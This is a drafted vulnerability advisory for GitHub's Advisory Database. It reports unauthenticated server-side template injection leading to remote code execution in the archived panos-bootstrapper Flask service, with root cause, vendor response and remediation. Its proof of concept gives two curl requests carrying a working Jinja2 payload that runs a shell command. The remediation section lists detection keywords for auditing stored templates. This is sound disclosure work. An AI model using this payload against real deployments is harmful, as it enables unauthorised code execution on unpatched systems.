# GitHub Advisory Database submission

Target: https://github.com/github/advisory-database
Workflow: open a new issue using the "Report a vulnerability in a public package" template, or submit a pull request adding an advisory YAML under `advisories/github-reviewed/`.

Because `panos-bootstrapper` is a Python application distributed as source
and container (not as a PyPI package), submit as an **unreviewed** advisory
by opening an issue; GitHub Security Lab will convert it to a reviewed GHSA
and assign a CVE.

---

## Issue title

Unauthenticated SSTI to RCE in PaloAltoNetworks/panos-bootstrapper (archived)

## Issue body (ready to paste)

### Affected software

- Vendor: Palo Alto Networks
- Project: `PaloAltoNetworks/panos-bootstrapper`
- Repository: https://github.com/PaloAltoNetworks/panos-bootstrapper
- Distribution: GitHub source + Dockerfile container image
- Affected versions: all commits containing the routes `/import_template`, `/update_template` and `/render_template` with no authentication; verified on HEAD commit `8128161a2cc1f4236274ed9cb2281c873734d673`
- Repository status: archived 2026-04-07; no fix available and none planned
- Ecosystem: generic (no package registry)

### Vulnerability

Unauthenticated server-side template injection in the Flask HTTP API that
yields remote code execution.

- CWE: CWE-1336 (SSTI), CWE-94 (code injection), CWE-306 (missing authentication)
- CVSS v3.1 vector: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- CVSS v3.1 base score: 9.8 (Critical)
- Authentication required: none
- User interaction: none
- Attack vector: network (HTTP)
- Impact: remote code execution as the service account

### Root cause

`bootstrapper/bootstrapper.py` registers 21 Flask routes, none protected by
authentication, session or API-key gates. Two of them chain into a template
sink:

- `POST /import_template` (line 397) writes an attacker-supplied Jinja2
  template to the application database via `bootstrapper_utils.import_template()`.
- `POST /render_template` (line 515) loads that stored template and calls
  `bootstrapper_utils.compile_template()`, which ends with
  `render_template_string(template, **configuration_parameters)` at
  `bootstrapper/lib/bootstrapper_utils.py:608`.

`render_template_string` uses Flask's default non-sandboxed Jinja2 environment.
`POST /update_template` (line 431) exposes the same primitive and additionally
permits overwriting legitimate templates.

The service's `required.issubset(configuration_parameters)` guard, backed by
`jinja2.meta.find_undeclared_variables()`, does not fire for payloads composed
of Jinja2 built-in globals (`cycler`, `lipsum`, `namespace`, `joiner`), since
those names are considered declared and never appear in the undeclared set.

### Proof of concept

```bash
TARGET="http://<host>:5000"

curl -sS -X POST "$TARGET/import_template" \
  -H 'Content-Type: application/json' \
  --data-binary '{
    "name": "pwn",
    "template": "{{ cycler.__init__.__globals__.os.popen(\"id\").read() }}",
    "description": "poc",
    "type": "bootstrap"
  }'

curl -sS -X POST "$TARGET/render_template" \
  -H 'Content-Type: application/json' \
  --data-binary '{"template_name":"pwn"}'
# -> uid=... gid=... groups=...
```

Full technical writeup, timeline and reproduction steps:
https://github.com/inilvinilra/panos-bootstrapper-ssti/blob/main/disclosure/writeup-public.md

### Vendor coordination

- 2026-06-23: Report delivered to `psirt@paloaltonetworks.com`.
- 2026-06-25: Palo Alto Networks PSIRT declined to triage. Verbatim: "`panos-bootstrapper` is an archived repository that is no longer actively maintained. As such, this report will not be triaged further. Users of this tool should avoid exposing the API to untrusted networks or discontinue use entirely."
- No CVE assigned by Palo Alto Networks PSIRT.
- No security advisory published on `security.paloaltonetworks.com`.
- No fix commit; repository is archived (read-only).

### Reachability

Default container entrypoint binds all interfaces on port 5000
(`CMD ["flask", "run", "--host=0.0.0.0", "--port=5000"]` in `Dockerfile`).
Any deployment publishing port 5000 to a non-trusted network is remotely
exploitable without authentication. The companion `panos-bootstrapper-ui`
reference compose binds the backend to `127.0.0.1`, which is not externally
reachable in that specific topology.

### Remediation for operators

- Decommission the service, or restrict it to loopback and front it with
  authentication.
- Audit the `templates` DB table for rows containing `__init__`, `__globals__`,
  `__class__`, `__mro__`, `__subclasses__`, `popen`, `system`,
  `__builtins__` or `request.application`.
- If maintaining a fork, replace `render_template_string` with
  `jinja2.sandbox.SandboxedEnvironment` and require authentication on every
  route.

### References

- Repository: https://github.com/PaloAltoNetworks/panos-bootstrapper
- Affected files on commit `8128161a`:
  - https://github.com/PaloAltoNetworks/panos-bootstrapper/blob/8128161a2cc1f4236274ed9cb2281c873734d673/bootstrapper/bootstrapper.py#L397
  - https://github.com/PaloAltoNetworks/panos-bootstrapper/blob/8128161a2cc1f4236274ed9cb2281c873734d673/bootstrapper/bootstrapper.py#L515
  - https://github.com/PaloAltoNetworks/panos-bootstrapper/blob/8128161a2cc1f4236274ed9cb2281c873734d673/bootstrapper/lib/bootstrapper_utils.py#L594-L608
- Public writeup: https://github.com/inilvinilra/panos-bootstrapper-ssti/blob/main/disclosure/writeup-public.md

### Credit

Reporter: Daghlar Mammadov (`<daghlarmammadov@gmail.com>`).
Request: CVE assignment and GHSA publication; researcher credit under
"Daghlar Mammadov".

### Request

CVE assignment and GHSA publication under GitHub as the CNA. Vendor CNA
(Palo Alto Networks PSIRT) has declined to triage because the repository is
archived; GitHub as a CNA is being asked to assign a CVE and publish a GHSA
so that downstream consumers (Dependabot, container-image scanners, SBOM
tooling) can detect the issue in deployed instances of this software.
